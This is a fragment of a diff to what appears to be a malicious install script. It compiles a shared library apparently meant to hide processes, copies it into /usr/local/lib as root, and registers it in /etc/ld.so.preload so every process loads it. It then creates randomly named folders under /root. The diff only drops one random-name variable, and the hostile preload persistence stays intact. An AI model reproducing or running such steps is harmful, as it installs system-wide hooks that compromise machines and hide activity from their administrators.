@@ -6,7 +6,6 @@ gcc -Wall -fPIC -shared -o libprocessh.so jik.c -ldl
 sudo mv libprocessh.so /usr/local/lib/ 
 echo /usr/local/lib/libprocessh.so >> /etc/ld.so.preload 
 cd /root 
-nimo=$(openssl rand -base64 5)
 fol=$(openssl rand -base64 6)
 ra3=$(openssl rand -base64 7)
 mkdir $fol
